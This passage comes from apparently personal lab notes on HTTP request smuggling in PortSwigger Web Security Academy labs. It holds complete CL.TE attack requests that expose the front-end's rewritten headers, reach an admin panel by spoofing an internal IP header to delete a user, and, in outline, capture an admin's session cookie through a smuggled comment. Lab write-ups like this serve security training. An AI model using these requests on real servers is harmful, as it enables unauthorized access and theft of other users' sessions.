Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

This results in a response containing the following:
```bash
<input id="email" value="wiener@normal-user.net" type="text">
```

Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:
```bash
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

The requests will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter. It will then reflect this value back in the response to the second request: 
```bash
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

> Note:
>
> Since the final request is being rewritten, you don't know how long it will end up. The value in the Content-Length header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest

Once you have revealed how the front-end server is rewriting requests, you can apply the necessary rewrites to your smuggled requests, to ensure they are processed in the intended way by the back-end server

### PRACTITIONER Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
We need the admin page, but it can only be accessed from localhost

So we first try to add `X-Forwarded-For: 127.0.0.1` header, but we still get Unauthorized, because the frontend server overwrites `X-Forwarded-For` header before it gets to the backend server

So we want to figure out if it's CL.TE or TE.CL, let's try doing that by using timing technique:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
x\r\n
```
The response is timing out and that's an indication that there is a CL.TE
So we've got to confirm that with differential responses:

Norm req:
```bash
POST / HTTP/1.1
Host: 0a7a00c80443862881fbb12700510041.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Attack req:
```bash
POST / HTTP/1.1
Host: ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 103 # 103 is the exact length from `0\r\n` up until (and including) `x=`
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
GET /jjjjjjjjjj HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
\r\n
x=
```
So we send attack, norm reqs and we get back 404 Not found. It confirms CL.TE

Now we try `X-Forwarded-For` header inside our attack req (in the second part of it)
But we get 401 Unauthorized anyway

So in the lab we have an endpoint that reflects whatever we send in the req body in the response.
This will be our normal request now:
```bash
POST / HTTP/1.1
Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

search=jjjj
```
And `jjjj` is reflected in the response

So we craft our attack req:
```bash
POST / HTTP/1.1
Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 105 # 105 includes everything up until `search=jjjj`
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 163

search=jjjj
```
And we send our norm req:
```bash
POST / HTTP/1.1
Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

search=jjj
```
And in the response to the normal req we get:
```bash
...
<section class=blog-header>
<h1>0 search results for 'jjjjPOST / HTTP/1.1
X-qRjKfQ-Ip: 194.44.253.30
Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
Content-Type: application/x-www-form-urlen'
</h1>
<hr>
</section>
...
```
So we smuggled the beginning of the subsequent request and we see that the frontend server is using `X-qRjKfQ-Ip: 194.44.253.30`

We can now use that header to access admin panel, by changing its value to 127.0.0.1:
So our attack req that deletes carlos:
```bash
POST / HTTP/1.1
Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
X-qRjKfQ-Ip: 127.0.0.1

x=
```

### Bypassing client authentication

### PRACTITIONER Lab: Exploiting HTTP request smuggling to capture other users' requests
First we figure out if it's CL.TE or TE.CL via timing technique and via differential responses
Eventually we see that there is CL.TE

To solve the lab we craft an attack request second part of which posts a comment on a page, but it does not post comment right away, it posts that comment as soon as the admin user makes a request to the server, and our poisoned backend server will actually post the admin's cookie and other request info as a blog comment



